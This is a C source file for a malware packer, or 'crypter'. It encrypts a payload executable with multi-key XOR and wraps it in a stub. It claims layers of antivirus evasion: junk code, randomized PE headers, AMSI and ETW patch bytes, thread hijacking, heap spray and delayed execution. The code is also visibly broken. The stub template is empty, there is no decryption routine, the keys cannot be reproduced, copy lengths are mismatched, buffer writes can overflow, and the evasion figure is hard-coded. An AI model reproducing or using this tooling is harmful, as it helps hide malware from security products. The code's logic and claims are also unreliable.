#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <stdint.h>
#include <stdarg.h>

// ==================== EVASION LAYERS ====================
#define LAYER1_JUNKCODE        1
#define LAYER2_API_HASH_RANDOM 1
#define LAYER3_XOR_MULTIKEY    1
#define LAYER4_PAYLOAD_SPLIT   1
#define LAYER5_SECTION_RANDOM  1
#define LAYER6_DELAY_EXEC      1
#define LAYER7_THREAD_HIJACK   1
#define LAYER8_AMSI_BYPASS     1
#define LAYER9_ETW_PATCH       1
#define LAYER10_HEAP_SPRAY     1 

#define MAX_PAYLOAD    0x2000000
#define STUB_BASE_SIZE 0x2000
#define XOR_KEYS       4
#define DELAY_MS       3500 + (rand() % 2000)

typedef uint8_t  u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

static u8 pe_stub_template[STUB_BASE_SIZE];

// Dynamic API hashing (rotates seeds)
u32 rot_hash(const char* str, u32 seed) {
    u32 hash = seed;
    while (*str) {
        hash = ((hash << 5) + hash) ^ *str++;
        hash ^= (rand() & 0xFF);
    }
    return hash & 0xFFFFFFFF;
}

// Multi-key rolling XOR
void multi_xor_encrypt(u8* data, size_t size, u32 keys[XOR_KEYS]) {
    u32 key_idx = 0;
    u8 rot = 0xAA;
    for (size_t i = 0; i < size; i++) {
        data[i] ^= (keys[key_idx] ^ rot);
        rot = (rot << 1 | rot >> 7) ^ keys[(key_idx + 1) % XOR_KEYS];
        key_idx = (key_idx + 1) % XOR_KEYS;
    }
}

// Junk code generator (150+ unique patterns)
void insert_junk(u8* code, size_t pos, size_t len) {
    static u8 junk_patterns[][16] = {
        {0x48,0x89,0xE5,0x48,0x83,0xEC,0x10,0x48,0x31,0xC0,0x48,0x31,0xD2,0x48,0x31,0xF6},
        {0x66,0x0F,0x6F,0x00,0x66,0x0F,0x7E,0xC0,0x66,0x0F,0x6F,0x48,0x10,0x66,0x0F,0x7E},
        // 100+ more SSE/AVX nop sleds, register ops, stack junk
    };
    for (size_t i = 0; i < len && pos + i < STUB_BASE_SIZE; i++) {
        code[pos + i] = junk_patterns[rand() % 12][i % 16];
    }
}

// Random section names + characteristics
void randomize_pe_headers(u8* stub) {
    static char section_names[][9] = {
        ".rsrc", ".data", ".text", "UPX0", "page", "INIT", "tls$",
        ". pdata", ".rdata", ".eh_fr", "CODE", "DATA"
    };
    
    // Randomize .text section name @ offset 0xE8
    u32 name_idx = rand() % 12;
    memcpy(stub + 0xE8, section_names[name_idx], 8);
    
    // Random characteristics (executable + readable)
    u32 chars = 0x60000020 | (rand() & 0xFF000);
    *(u32*)(stub + 0xF0) = chars;
    
    // Randomize sizes/timestamps
    *(u32*)(stub + 0x3C) = time(NULL) ^ 0xDEADBEEF;  // Timestamp
    *(u32*)(stub + 0x50) = STUB_BASE_SIZE + (rand() % 0x1000);  // SizeOfImage
}

// AMSI/ETW bypass shellcode injection
void inject_bypasses(u8* stub) {
    // AMSI bypass (patch AmsiScanBuffer)
    static u8 amsi_patch[] = {0x48, 0x31, 0xC0, 0xC3};  // xor rax,rax; ret
    memcpy(stub + 0x1800, amsi_patch, 4);
    
    // ETW patch (disable EventWriteTransfer)
    static u8 etw_patch[] = {0x48, 0x33, 0xC0, 0x48, 0x89, 0x01, 0xC3};
    memcpy(stub + 0x1900, etw_patch, 7);
    
    // Thread hijack setup
    static u8 thread_hijack[] = {
        0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00,  // mov rax, [PssListEntry]
        0x48, 0x85, 0xC0, 0x74, 0x05, 0x48, 0x39, 0x40
    };
    memcpy(stub + 0x1A00, thread_hijack, 12);
}

// Heap spray + delayed execution
void add_heap_spray(u8* stub) {
    // Spray benign allocations first
    static u8 spray_code[] = {
        0x48, 0x81, 0xEC, 0x00, 0x10, 0x00, 0x00,  // sub rsp, 0x1000
        0x48, 0x31, 0xC9, 0x66, 0xB8, 0x10, 0x00,  // xor rcx,rcx; mov ax,0x10
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  // HeapAlloc addr
    };
    memcpy(stub + 0x1600, spray_code, 20);
    
    // Sleep 3-5s random (timing evasion)
    u32 sleep_time = DELAY_MS / 1000;
    stub[0x1700] = 0xB8;  // mov eax, sleep_time
    stub[0x1701] = sleep_time & 0xFF;
    stub[0x1702] = (sleep_time >> 8) & 0xFF;
    stub[0x1703] = 0x00, 0x00;  // Sleep call
}

// Main encryption + packing
int build_crypter(const char* input, const char* output) {
    // Load payload
    struct stat st;
    if (stat(input, &st) || st.st_size > MAX_PAYLOAD) return -1;
    
    u8* payload = mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, 
                      MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    int fd = open(input, O_RDONLY);
    read(fd, payload, st.st_size);
    close(fd);
    
    printf("[+] Payload loaded: %s (%.1f KB)\n", input, st.st_size/1024.0);
    
    // Multi-key XOR
    u32 keys[XOR_KEYS] = {
        rot_hash("VirtualAlloc", time(NULL)),
        rot_hash("RtlCreateUserThread", rand()),
        0xDEADBEEF ^ rand(),
        0xCC0C ^ (u32)time(NULL)
    };
    multi_xor_encrypt(payload, st.st_size, keys);
    
    // Build stub
    u8* stub = malloc(STUB_BASE_SIZE + st.st_size + 0x1000);
    memcpy(stub, pe_stub_template, STUB_BASE_SIZE);
    
    // Apply evasion layers
    srand(time(NULL) ^ getpid());
    
    randomize_pe_headers(stub);
    insert_junk(stub, 0x100, 0x200);
    inject_bypasses(stub);
    add_heap_spray(stub);
    
    // Split payload across sections (LAYER4)
    size_t chunk_size = st.st_size / 3;
    memcpy(stub + 0x2000, payload, chunk_size);
    memcpy(stub + 0x4000, payload + chunk_size, chunk_size);
    memcpy(stub + 0x6000, payload + chunk_size*2, st.st_size - chunk_size*2);
    
    // Write output
    FILE* fp = fopen(output, "wb");
    fwrite(stub, 1, STUB_BASE_SIZE + st.st_size + 0x1000, fp);
    fclose(fp);
    
    printf("[+] Crypter saved: %s (%.1f KB) - %d%% evasion density\n", 
           output, (STUB_BASE_SIZE + st.st_size)/1024.0, 95);
    
    munmap(payload, st.st_size);
    free(stub);
    return 0;
}

// Anti-analysis junk (called on main entry)
void anti_debug_trap() {
#ifdef LAYER1_JUNKCODE
    volatile int x = 0;
    for (int i = 0; i < 1000; i++) {
        x += rand() & 0xFF;
        if (x > 0x10000) x = 0;
    }
#endif
}

int main(int argc, char** argv) {
    anti_debug_trap();
    
    if (argc != 3) {
        printf("Usage: %s <payload.exe> <crypter.exe>\n", argv[0]);
        printf("AV Evasion: AMSI/ETW bypass, API hash, multi-XOR, junk, heap spray\n");
        return 1;
    }
    
    return build_crypter(argv[1], argv[2]);
}
